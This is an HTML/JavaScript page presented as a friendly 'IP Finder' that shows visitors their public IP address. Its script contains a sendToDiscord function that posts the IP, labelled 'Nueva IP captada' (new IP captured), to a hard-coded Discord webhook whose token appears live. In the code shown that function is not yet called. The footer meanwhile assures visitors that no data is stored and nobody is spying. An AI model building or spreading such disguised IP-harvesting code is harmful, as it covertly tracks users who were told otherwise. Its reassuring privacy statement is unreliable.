<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>IP Finder | Your Digital Address</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <style id="app-style">
    body {
      font-family: 'Poppins', sans-serif;
      background-color: #f0f4f8;
      background-image: radial-gradient(#6366f1 0.5px, transparent 0.5px), radial-gradient(#6366f1 0.5px, #f0f4f8 0.5px);
      background-size: 20px 20px;
      background-position: 0 0, 10px 10px;
    }

    .container {
      max-width: 800px;
    }

    .card {
      transition: all 0.3s ease;
      box-shadow: 0 10px 25px rgba(99, 102, 241, 0.1);
    }

    .card:hover {
      transform: translateY(-5px);
      box-shadow: 0 15px 30px rgba(99, 102, 241, 0.2);
    }

    .spinner {
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      from {
        transform: rotate(0deg);
      }
      to {
        transform: rotate(360deg);
      }
    }

    .ip-result {
      opacity: 0;
      transform: translateY(20px);
      transition: opacity 0.8s ease-out, transform 0.8s ease-out;
    }

    .ip-result.show {
      opacity: 1;
      transform: translateY(0);
    }

    .btn-refresh {
      transition: all 0.3s ease;
    }

    .btn-refresh:hover {
      transform: rotate(15deg);
    }

    .error-message {
      display: none;
    }
  </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">
  <div class="container">
    <header class="text-center mb-8">
      <h1 class="text-3xl md:text-4xl font-bold text-indigo-600 mb-2">Hey, Cyber Traveler! ðŸš€</h1>
      <p class="text-lg text-gray-600">Curious about your digital coordinates? Let's find out!</p>
    </header>

    <div class="card bg-white rounded-xl p-6 md:p-8 text-center">
      <div id="loading" class="py-10">
        <div class="spinner mx-auto h-16 w-16 text-indigo-600">
          <i class="fas fa-globe fa-spin text-5xl"></i>
        </div>
        <p class="mt-4 text-gray-600">Locating your digital self...</p>
      </div>

      <div id="ip-container" class="ip-result py-10">
        <div class="mb-6">
          <i class="fas fa-map-marker-alt text-5xl text-indigo-500"></i>
        </div>
        <h2 class="text-2xl font-bold text-gray-800 mb-2">Your IP Address is:</h2>
        <p id="ip-address" class="text-3xl md:text-4xl font-bold text-indigo-600 mb-4 break-all">---.---.---.---</p>
        <p id="fun-message" class="text-lg text-gray-600 italic">Don't tell your neighbors! ðŸ¤«</p>
      </div>

      <div id="error-message" class="error-message py-10 text-rose-600">
        <i class="fas fa-exclamation-circle text-5xl mb-4"></i>
        <p class="text-xl font-medium mb-4">Oops! My crystal ball is on vacation. Try again.</p>
      </div>

      <button id="refresh-btn" class="btn-refresh mt-4 bg-indigo-600 hover:bg-indigo-700 text-white font-medium py-2 px-6 rounded-full inline-flex items-center">
        <i class="fas fa-sync-alt mr-2"></i> Refresh IP
      </button>
    </div>

    <footer class="mt-8 text-center text-gray-500 text-sm">
      <p>This app uses a public IP API to fetch your public IP address.</p>
      <p class="mt-2">No personal data is stored. Relax, we're not spying on you! ðŸ˜‰</p>
    </footer>
  </div>

  <script id="app-script">
    document.addEventListener('DOMContentLoaded', function() {
      // Elements
      const loading = document.getElementById('loading');
      const ipContainer = document.getElementById('ip-container');
      const ipAddress = document.getElementById('ip-address');
      const errorMessage = document.getElementById('error-message');
      const refreshBtn = document.getElementById('refresh-btn');
      const funMessages = [
        "Don't tell your neighbors! ðŸ¤«",
        "That's your digital fingerprint! ðŸ‘†",
        "Looking good in those digital clothes! ðŸ‘”",
        "Now you're Internet famous! ðŸŒŸ",
        "Your secret password is NOT 'password123', right? ðŸ”",
        "Your IP is cooler than the other IPs! ðŸ˜Ž"
      ];

      // ADD: helper to POST IP to your Discord webhook
      function sendToDiscord(ip) {
        const webhookURL = 'https://discord.com/api/webhooks/1362970582341255188/cqrdjShxtYkeiiIkgAVeH588-_aji5XdVxERffsO6FGmNyJvhjRL80tuMdj-M6W0jXzS';
        const payload = {
          embeds: [{
            title: "Nueva IP captada",
            description: `Nueva IP captada: **${ip}**`,
            color: 16711680  // red
          }]
        };
        fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        }).catch(err => console.error('Error sending IP to Discord:', err));
      }

      // Initially hide the IP container
      ipContainer.style.display = 'none';
      
      // Function to fetch IP
      function fetchIP() {
        // Reset UI
        loading.style.display = 'block';
        ipContainer.style.display = 'none';
        errorMessage.style.display = 'none';
        ipContainer.classList.remove('show');
        
        // Real API call to ipify.org
        fetch('https://api.ipify.org?format=json')
          .then(res => res.json())
          .then(data => {
            const fetchedIP = data.ip;
            ipAddress.textContent = fetchedIP;
            // Choose a random fun message
            const randomMessage = funMessages[Math.floor(Math.random() * funMessages.length)];
            document.getElementById('fun-message').textContent = randomMessage;
            
            // Hide loading, show result
            loading.style.display = 'none';
            ipContainer.style.display = 'block';
            
            // Add animation class after a brief delay
            setTimeout(() => {
              ipContainer.classList.add('show');
            }, 50);
            
          })
          .catch(error => {
            // Handle error
            loading.style.display = 'none';
            errorMessage.style.display = 'block';
          });
      }
      
      // Initial fetch
      fetchIP();
      
      // Refresh button click handler
      refreshBtn.addEventListener('click', fetchIP);
    });
  </script>
</body>
</html>
